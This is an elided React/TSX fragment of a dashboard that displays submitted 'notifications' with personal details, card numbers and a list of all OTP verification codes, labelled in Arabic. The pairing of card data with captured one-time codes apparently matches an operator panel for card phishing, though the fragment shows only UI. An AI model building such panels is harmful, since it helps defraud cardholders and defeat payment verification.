...
function PersonalInfoCard({ notification }: { notification: Notification }) {
        ...
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          ...
          {notification.allOtps && notification.allOtps.length > 0 && (
            <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-purple-200 shadow-sm">
              <span className="text-xs font-medium text-gray-600 mb-3">
                جميع أرمز التحقق
              </span>
...
function OtpInfoCard({ notification }: { notification: Notification }) {
  return (
...
function NotificationsContent() {
  ...
  const cardSubmissionsCount = notifications.filter(
    (n) => n?.cardNumber
  ).length;
  ...
  return (
    ...
    >
      <div className="max-w-7xl mx-auto space-y-6">
        ...
        {/* Other Info Cards */}
        {selectedNotification && selectedTab === "personal" && (
          <PersonalInfoCard notification={selectedNotification} />
        )}
        {selectedNotification && selectedTab === "card" && (
      ...
      <Dialog open={selectedTab !== null} onOpenChange={closeDialog}>
        ...
        >
          ...
          {selectedTab === "card" && selectedNotification && (
            <CardInfoCard notification={selectedNotification} />
          )}
          {selectedTab === "otp" && selectedNotification && (
            <OtpInfoCard notification={selectedNotification} />
          )}
        </DialogContent>
      </Dialog>
